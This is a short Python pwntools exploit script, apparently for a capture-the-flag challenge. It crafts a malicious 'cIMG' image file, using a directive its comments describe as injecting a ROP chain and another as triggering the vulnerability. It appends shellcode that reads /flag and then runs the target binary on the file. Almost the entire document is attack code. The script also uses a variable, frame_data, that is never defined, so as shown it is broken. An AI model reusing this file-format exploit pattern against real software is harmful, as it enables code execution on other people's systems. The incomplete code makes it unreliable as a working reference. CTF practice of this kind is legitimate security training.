#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.os = "linux"

bin_path = "/challenge/integration-cimg-screenshot-sc"

shellcode = asm(shellcraft.cat("/flag"))

# elf = ELF(bin_path)

width = 1
height = 1
pixel_count = width * height
directive_count = 1

# magic + version + width + height + directive_count
cimg_payload = (
    b"cIMG" + p16(4) + p8(width) + p8(height) + p32(directive_count) + p32(pixel_count)
)

# directive_code + directive_data
cimg_payload += p16(2) + p8(0) + p8(0) + p8(width) + p8(height) + frame_data  # 注入 ROP

cimg_payload += p16(0x539) + p8(0) + p8(0) + p8(0) + p8(width) + p8(height)  # 触发漏洞

cimg_payload += shellcode

with open("payload.cimg", "wb") as f:
    f.write(cimg_payload)

# io = gdb.debug(
#     [BINARY, "payload.cimg"],
#     env={"SHELL": "/bin/bash"},
#     gdbscript="""
#     b *0x00401e99\n
#     continue
#     ni
#     """,
# )

io = process([bin_path, "payload.cimg"])

io.interactive()
